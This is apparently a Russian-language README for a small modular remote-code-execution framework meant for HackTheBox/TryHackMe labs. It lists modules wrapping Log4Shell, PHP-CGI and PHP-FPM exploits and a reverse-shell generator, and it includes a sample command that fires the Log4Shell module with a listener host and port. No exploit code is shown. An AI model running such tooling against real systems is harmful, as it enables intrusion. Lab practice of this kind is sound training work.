# rce-tool — mini RCE framework для HTB/THM

Лёгкий модульный фреймворк: `use <module>` → `set OPT value` → `run`.

## Быстрый старт

```bash
python3 rce.py            # интерактивный режим
python3 rce.py -l         # список модулей
python3 rce.py -m log4shell -o TARGET=http://10.10.10.5:8080 -o LHOST=10.10.14.7 -o LPORT=4444

Модули
Модуль	Описание	Требования
log4shell	CVE-2021-44228 (обёртка kozmer/log4j-shell-poc)	git, java 1.8.0_20, javac
cve_2024_4577	PHP-CGI argument injection (Windows)	git, python3
cve_2019_11043	PHP-FPM underflow (nginx)	git, go
revshell	Генератор reverse-shell one-liner'ов	—
Добавление нового модуля

    Скопируй modules/_template.py в modules/<имя>.py.

    Заполни name, options, run().

    Перезапусти rce.py — модуль появится автоматически.

Синхронизация с Kali
bash

git pull     # в Kali, после обновлений на GitHub
